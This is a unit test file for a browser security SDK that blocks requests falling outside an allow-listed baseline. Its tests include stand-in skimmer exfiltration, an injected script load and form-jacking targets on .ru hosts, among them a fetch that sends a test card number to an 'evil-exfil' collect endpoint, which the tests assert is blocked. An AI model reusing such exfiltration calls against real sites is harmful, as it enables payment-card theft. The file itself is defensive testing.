// Unit tests for the browser SDK — pure shape logic + the block decision + the real fetch wrapper.
// Run: node browser/test.cjs
const assert = require("assert");
const NS = require("./nemesis-shield.js");

let pass = 0;
const ok = (name) => {
  pass++;
  console.log("  ok  " + name);
};

// 1. Shape is stable per (kind, origin) and distinguishes origins.
{
  const a = NS.shapeOf("connect", "https://api.example.com");
  const b = NS.shapeOf("connect", "https://api.example.com");
  const evil = NS.shapeOf("connect", "https://evil.example.com");
  assert.strictEqual(a.shape, b.shape);
  assert.notStrictEqual(a.shape, evil.shape);
  assert.strictEqual(a.route, "connect://https://api.example.com");
  ok("shape stable + origin-sensitive");
}

// 2. Positive-security decide: allow-listed passes, unknown-with-baseline blocks, no-baseline fails open.
{
  const s = NS.createShield({ token: "x", env: {}, fetch: () => Promise.resolve({ ok: false }) });
  const approved = NS.shapeOf("connect", "https://api.example.com").shape;
  // no baseline yet -> never block
  assert.strictEqual(s.shouldBlock("connect", "https://anything.com"), false);
  s._applyPolicy({ mode: "enforce", policy: { shapes: { [approved]: "allow" } } });
  assert.strictEqual(s.decide(approved), null); // approved
  assert.ok(s.decide(NS.shapeOf("connect", "https://evil.com").shape)); // off-baseline
  ok("decide: approve / off-baseline / fail-open");
}

// 3. shouldBlock enforces off-baseline, but NEVER blocks first-party.
{
  const s = NS.createShield({ token: "x", selfOrigin: "https://shop.example.com", env: {}, fetch: () => Promise.resolve({ ok: false }) });
  s._applyPolicy({
    mode: "enforce",
    policy: { shapes: { [NS.shapeOf("connect", "https://api.stripe.com").shape]: "allow" } },
  });
  assert.strictEqual(s.shouldBlock("connect", "https://api.stripe.com"), false); // approved payment API
  assert.strictEqual(s.shouldBlock("connect", "https://shop.example.com"), false); // first-party
  assert.strictEqual(s.shouldBlock("connect", "https://evil-exfil.ru"), true); // skimmer exfil
  assert.strictEqual(s.shouldBlock("script", "https://evil-cdn.ru"), true); // injected Magecart script
  assert.strictEqual(s.shouldBlock("form", "https://phish.ru"), true); // form-jacking
  ok("shouldBlock: exfil/skimmer/formjack blocked, legit + first-party allowed");
}

// 4. The real fetch WRAPPER blocks an exfil call and lets an approved one through.
(async () => {
  const calls = [];
  const env = {
    location: { origin: "https://shop.example.com" },
    fetch: (u) => {
      calls.push(String(u));
      return Promise.resolve({ ok: true, json: () => Promise.resolve({}) });
    },
  };
  const s = NS.createShield({ token: "x", env, fetch: env.fetch });
  s._applyPolicy({
    mode: "enforce",
    policy: { shapes: { [NS.shapeOf("connect", "https://api.stripe.com").shape]: "allow" } },
  });
  s.install(); // wraps env.fetch in place

  await env.fetch("https://api.stripe.com/charge"); // approved -> passes through
  assert.ok(calls.includes("https://api.stripe.com/charge"));

  let blocked = false;
  try {
    await env.fetch("https://evil-exfil.ru/collect?cc=4111");
  } catch (e) {
    blocked = e.message === "blocked_by_nemesis_shield";
  }
  assert.ok(blocked, "exfil fetch must be rejected");
  assert.ok(!calls.includes("https://evil-exfil.ru/collect?cc=4111"), "exfil must never reach the network");
  ok("live fetch wrapper: exfil blocked, legit passes");

  console.log("\n" + pass + "/4 browser SDK tests passed");
})().catch((e) => {
  console.error("FAIL:", e.message);
  process.exit(1);
});
